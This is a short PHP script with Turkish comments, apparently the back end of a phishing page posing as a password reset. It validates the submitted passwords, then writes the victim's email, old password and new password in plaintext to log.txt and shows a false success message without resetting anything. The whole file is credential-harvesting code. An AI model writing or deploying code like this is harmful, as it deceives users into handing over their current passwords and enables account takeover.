<?php
session_start();
date_default_timezone_set('Europe/Istanbul');

// Form verilerini al
$old_password = $_POST['old_password'];
$new_password = $_POST['new_password'];
$confirm_password = $_POST['confirm_password'];
$email = $_SESSION['reset_email'] ?? 'bilinmiyor';  // ← düzeltildi
$date = date("Y-m-d H:i:s");

// Şifre kontrolü: eşleşmiyor
if ($new_password !== $confirm_password) {
    header("Location: reset-password.html?error=nomatch");
    exit();
}

// Şifre kontrolü: eski ve yeni aynı
if ($old_password === $new_password) {
    header("Location: reset-password.html?error=samepassword");
    exit();
}

// Şifre kontrolü: uzunluk < 8
if (strlen($new_password) < 8) {
    header("Location: reset-password.html?error=short");
    exit();
}

// Bilgileri log.txt dosyasına yaz
$file = fopen("log.txt", "a");
fwrite($file, "RESET | Email: $email | Eski: $old_password | Yeni: $new_password | Tarih: $date\n");
fclose($file);

// Ana sayfaya yönlendir 
header("Location: index.html?reset=success");
exit();
?>
